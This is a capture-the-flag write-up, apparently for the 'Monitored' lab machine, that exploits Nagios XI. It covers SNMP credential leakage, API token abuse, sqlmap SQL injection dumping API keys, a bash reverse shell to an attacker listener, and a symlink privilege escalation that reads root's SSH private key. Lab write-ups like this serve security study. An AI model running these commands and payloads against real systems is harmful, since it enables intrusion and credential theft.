## Monitored 

### Lab Details 

- Difficulty: Medium
- Type: Linux

#### Enumeration
- run `nmap`, based on the scan the server has 3 open ports.
```
nmap -sT -T4 -vv -A -p- --min-rate 1500 -Pn -sC -oN Monitored.nmap 10.10.11.248

PORT     STATE  SERVICE          REASON       VERSION
22/tcp   open   tcpwrapped       syn-ack
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/xFgJTbVC36GNHaE0GG4n/bWZGaD2aE7lsFUvXVdbINrl0qzBPVCMuOE1HNf0LHi09obr2Upt9VURzpYdrQp/7SX2NDet9pb+UQnB1IgjRSxoIxjsOX756a7nzi71tdcR3I0sALQ4ay5I5GO4TvaVq+o8D01v94B0Qm47LVk7J3mN4wFR17lYcCnm0kwxNBsKsAgZVETxGtPgTP6hbauEk/SKGA5GASdWHvbVhRHgmBz2l7oPrTot5e+4m8A7/5qej2y5PZ9Hq/2yOldrNpS77ID689h2fcOLt4fZMUbxuDzQIqGsFLPhmJn5SUCG9aNrWcjZwSL2LtLUCRt6PbW39UAfGf47XWiSs/qTWwW/yw73S8n5oU5rBqH/peFIpQDh2iSmIhbDq36FPv5a2Qi8HyY6ApTAMFhwQE6MnxpysKLt/xEGSDUBXh+4PwnR0sXkxgnL8QtLXKC2YBY04jGG0DXGXxh3xEZ3vmPV961dcsNd6Up8mmSC43g5gj2ML/E=
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBbeArqg4dgxZEFQzd3zpod1RYGUH6Jfz6tcQjHsVTvRNnUzqx5nc7gK2kUUo1HxbEAH+cPziFjNJc6q7vvpzt4=
|   256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5o+WJqnyLpmJtLyPL+tEUTFbjMZkx3jUUFqejioAj7
80/tcp   open   tcpwrapped       syn-ack
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
443/tcp  open   tcpwrapped       syn-ack
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/emailAddress=support@monitored.htb/localityName=Bournemouth
| Issuer: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK/emailAddress=support@monitored.htb/localityName=Bournemouth
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-11T21:46:55
| Not valid after:  2297-08-25T21:46:55
| MD5:   b36a:5560:7a5f:047d:9838:6450:4d67:cfe0
| SHA-1: 6109:3844:8c36:b08b:0ae8:a132:971c:8e89:cfac:2b5b
| -----BEGIN CERTIFICATE-----
| MIID/zCCAuegAwIBAgIUVhOvMcK6dv/Kvzplbf6IxOePX3EwDQYJKoZIhvcNAQEL
| BQAwgY0xCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZEb3JzZXQxFDASBgNVBAcMC0Jv
| dXJuZW1vdXRoMRIwEAYDVQQKDAlNb25pdG9yZWQxHTAbBgNVBAMMFG5hZ2lvcy5t
| b25pdG9yZWQuaHRiMSQwIgYJKoZIhvcNAQkBFhVzdXBwb3J0QG1vbml0b3JlZC5o
| dGIwIBcNMjMxMTExMjE0NjU1WhgPMjI5NzA4MjUyMTQ2NTVaMIGNMQswCQYDVQQG
| EwJVSzEPMA0GA1UECAwGRG9yc2V0MRQwEgYDVQQHDAtCb3VybmVtb3V0aDESMBAG
| A1UECgwJTW9uaXRvcmVkMR0wGwYDVQQDDBRuYWdpb3MubW9uaXRvcmVkLmh0YjEk
| MCIGCSqGSIb3DQEJARYVc3VwcG9ydEBtb25pdG9yZWQuaHRiMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1qRRCKn9wFGquYFdqh7cp4WSTPnKdAwkycqk
| a3WTY0yOubucGmA3jAVdPuSJ0Vp0HOhkbAdo08JVzpvPX7Lh8mIEDRSX39FDYClP
| vQIAldCuWGkZ3QWukRg9a7dK++KL79Iz+XbIAR/XLT9ANoMi8/1GP2BKHvd7uJq7
| LV0xrjtMD6emwDTKFOk5fXaqOeODgnFJyyXQYZrxQQeSATl7cLc1AbX3/6XBsBH7
| e3xWVRMaRxBTwbJ/mZ3BicIGpxGGZnrckdQ8Zv+LRiwvRl1jpEnEeFjazwYWrcH+
| 6BaOvmh4lFPBi3f/f/z5VboRKP0JB0r6I3NM6Zsh8V/Inh4fxQIDAQABo1MwUTAd
| BgNVHQ4EFgQU6VSiElsGw+kqXUryTaN4Wp+a4VswHwYDVR0jBBgwFoAU6VSiElsG
| w+kqXUryTaN4Wp+a4VswDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
| AQEAdPGDylezaB8d/u2ufsA6hinUXF61RkqcKGFjCO+j3VrrYWdM2wHF83WMQjLF
| 03tSek952fObiU2W3vKfA/lvFRfBbgNhYEL0dMVVM95cI46fNTbignCj2yhScjIz
| W9oeghcR44tkU4sRd4Ot9L/KXef35pUkeFCmQ2Xm74/5aIfrUzMnzvazyi661Q97
| mRGL52qMScpl8BCBZkdmx1SfcVgn6qHHZpy+EJ2yfJtQixOgMz3I+hZYkPFjMsgf
| k9w6Z6wmlalRLv3tuPqv8X3o+fWFSDASlf2uMFh1MIje5S/jp3k+nFhemzcsd/al
| 4c8NpU/6egay1sl2ZrQuO8feYA==
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1

```
- port `443` reveals the domain name of the application running on the server `nagios.monitored.htb` add that to `/etc/hosts`
- enumerate subdomain and directories results to nothing
- tried default login, unable to login 
- tried performing `udp` scan on server and found more open ports 
```
PORT      STATE         SERVICE      VERSION
68/udp    open|filtered dhcpc
123/udp   open          ntp          NTP v4 (unsynchronized)
| ntp-info: 
|_  
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:389          0.0.0.0:0
|   TCP  127.0.0.1:25         0.0.0.0:0
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.1:5432       0.0.0.0:0
|   TCP  127.0.0.1:7878       0.0.0.0:0
|   TCP  127.0.0.1:52604      127.0.1.1:80
|   TCP  127.0.0.1:52618      127.0.1.1:80
|   UDP  0.0.0.0:68           *:*
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:162          *:*
|   UDP  10.10.11.248:123     *:*
|_  UDP  127.0.0.1:123        *:*
| snmp-sysdescr: Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
|_  System uptime: 1h05m20.60s (392060 timeticks)
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 652.24 Kb sent, 648.25 Kb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.248  Netmask: 255.255.254.0
|     MAC address: 00:50:56:b9:3a:cb (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 20.45 Mb sent, 15.79 Mb received
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 6f3fa7421af94c6500000000
|   snmpEngineBoots: 36
|_  snmpEngineTime: 1h05m20s
| snmp-processes: 
|   1: 
|   2: 
|   3: 
|   4: 
|   6: 
|   8: 
|   9: 
|   10: 
|   11: 
|   12: 
|   13: 
|   14: 
|   15: 
|   16: 
|   17: 
|   18: 
|   20: 
|   23: 
|   24: 
|   25: 
|   26: 
|   27: 
|   28: 
|   29: 
|   30: 
|   31: 
|   49: 
|   50: 
|   51: 
|   52: 
|   53: 
|   54: 
|   56: 
|   57: 
|   58: 
|   59: 
|   60: 
|   61: 
|   62: 
|   63: 
|   64: 
|   65: 
|   66: 
|   67: 
|   68: 
|   69: 
|   70: 
|   71: 
|   72: 
|   73: 
|   74: 
|   75: 
|   76: 
|   77: 
|   78: 
|   79: 
|   80: 
|   81: 
|   82: 
|   83: 
|   84: 
|   85: 
|   86: 
|   87: 
|   88: 
|   89: 
|   90: 
|   91: 
|   92: 
|   101: 
|   104: 
|   105: 
|   152: 
|   153: 
|   155: 
|   157: 
|   158: 
|   159: 
|   160: 
|   162: 
|   163: 
|   164: 
|   165: 
|   166: 
|   167: 
|   168: 
|_  169: 
162/udp   open          snmp         net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5a44ab2146ff4c6500000000
|   snmpEngineBoots: 27
|_  snmpEngineTime: 1h05m20s
Service Info: Host: monitored
<snip>
```
- `snmp` is running on the target, using `snmpwalk` to enumerate the service
```
$ snmpwalk -v 2c -c public nagios.monitored.htb
<snip>
iso.3.6.1.2.1.25.4.2.1.5.897 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.1275 = STRING: "-bd -q30m"
iso.3.6.1.2.1.25.4.2.1.5.1337 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1340 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1341 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
<snip>
```
#### Initial Foothold 
- when attempting login to `Nagios` we get `The specified user account has been disabled or does not exist`
- according to https://support.nagios.com/forum/viewtopic.php?p=310411#p310411
- we can using an API to get the `AUTH token`
```
$ curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5'
{"username":"svc","user_id":"2","auth_token":"3d8d1ceefba607d1cb29a232fa68d2c851a01796","valid_min":5,"valid_until":"Wed, 20 Aug 2025 21:21:43 -0400"}
```
- we can attempt to login using the `AUTH token` by injecting it into the URL
```
https://nagios.monitored.htb/nagiosxi/index.php?token=<token>
```
- according to the dashboard the current version is `5.11.0`
- searching online and found SQLi vulnerability for this version of `Nagios XI`
```bash
## the cookie must be obained from dev tool once logged in
$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php? action=acknowledge_banner_message&id=3" --batch -p id -cookie="nagiosxi=dsaq439hoqvb80rm3s1olq5152" --dbs --threads=10
<snip>
[20:58:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:58:45] [INFO] fetching database names
[20:58:45] [INFO] starting 2 threads
[20:58:45] [INFO] resumed: 'nagiosxi'
[20:58:45] [INFO] resumed: 'information_schema'
available databases [2]:
[*] information_schema
[*] nagiosxi
<snip>
```
- there is a table called `xi_users` which contains `APIs`
```
$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php? action=acknowledge_banner_message&id=3" --batch -p id -cookie="nagiosxi=dsaq439hoqvb80rm3s1olq5152" -D nagiosxi -T xi_users --dump --threads=10
```

![[api_keys.png]]
- we can use the `API key` found to create a new admin user in the application
```
$  curl -k --silent "http://nagios.monitored.htb/nagiosxi/api/v1/system/user&apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" -d "username=test&password=password123&name=test&email=user@localhost&auth_level=admin"
{"success":"User account test was added successfully!","user_id":7}
```
- login into the application using the newly created user
![[admin_login.png]]
- getting RCE will require us to create a new command and execute it done in the application
- creating the payload:
	- Configure -> Core Config Manager -> Commands -> Create a new command
	- `/bin/bash -c 'bash -i >& /dev/tcp/<attacker ip>/4444 0>&1`
	- start up nc listener on attacker side
- executing the payload:
	- Monitoring -> Hosts -> Click on localhost -> select the newly created command as check command and click on Run Check Command
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.14] from (UNKNOWN) [10.10.11.248] 46910
bash: cannot set terminal process group (86558): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ ls
ls
cookie.txt
user.txt
```
#### Lateral Movement (If any)

#### Privilege Escalation
- check `sudo -l`
```
nagios@monitored:~/.ssh$ sudo -l
sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```
- we get an array of scripts we can run as root without password
- going through the scripts one by one and found `/usr/local/nagiosxi/scripts/components/getprofile.sh` is not sanitizing the `$folder` variable properly which we can utilize  
```bash
echo "Getting phpmailer.log..."
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
fi
```
- we can perform `Symbolic Link Attacks` by creating a symbolic link named `phpmailer.log` and point it to a sensitive file e.g. /root/.ssh/id_rsa
```bash
## creating the Symbolic Link
$ ln -s /root/.ssh/id_rsa /usr/local/nagiosxi/tmp/phpmailer.log

## Run the vulnerable script
$ sudo ./getprofile.sh attacker_folder
 
$ cp /usr/local/nagiosxi/var/components/profile.zip /tmp/

$ cd /tmp

$ unzip profile.zip

$ cat profile-<ID>/phpmailer.log 
cat ./phpmailer.log
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZYnlG22OdnxaaK98DJMc9isuSgg9wtjC0r1iTzlSRVhNALtSd2C
FSINj1byqeOkrieC8Ftrte+9eTrvfk7Kpa8WH0S0LsotASTXjj4QCuOcmgq9Im5SDhVG7/
z9aEwa3bo8u45+7b+zSDKIolVkGogA6b2wde5E3wkHHDUXfbpwQKpURp9oAEHfUGSDJp6V
bok57e6nS9w4mj24R4ujg48NXzMyY88uhj3HwDxi097dMcN8WvIVzc+/kDPUAPm+l/8w89
9MxTIZrV6uv4/iJyPiK1LtHPfhRuFI3xe6Sfy7//UxGZmshi23mvavPZ6Zq0qIOmvNTu17
V5wg5aAITUJ0VY9xuIhtwIAFSfgGAF4MF/P+zFYQkYLOqyVm++2hZbSLRwMymJ5iSmIo4p
lbxPjGZTWJ7O/pnXzc5h83N2FSG0+S4SmmtzPfGntxciv2j+F7ToMfMTd7Np9/lJv3Yb8J
/mxP2qnDTaI5QjZmyRJU3bk4qk9shTnOpXYGn0/hAAAFiJ4coHueHKB7AAAAB3NzaC1yc2
EAAAGBAJ2WJ5RttjnZ8WmivfAyTHPYrLkoIPcLYwtK9Yk85UkVYTQC7UndghUiDY9W8qnj
pK4ngvBba7XvvXk6735OyqWvFh9EtC7KLQEk144+EArjnJoKvSJuUg4VRu/8/WhMGt26PL
uOfu2/s0gyiKJVZBqIAOm9sHXuRN8JBxw1F326cECqVEafaABB31BkgyaelW6JOe3up0vc
OJo9uEeLo4OPDV8zMmPPLoY9x8A8YtPe3THDfFryFc3Pv5Az1AD5vpf/MPPfTMUyGa1err
<snip>
-----END OPENSSH PRIVATE KEY-----
```
- we can copy the private key and use it to authenticate as root user
```
$ ssh root@10.10.11.248 -i ./root.rsa 

Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@monitored:~# 
root@monitored:~# ls
root.txt
```
#### Resources

#### Lesson Learned
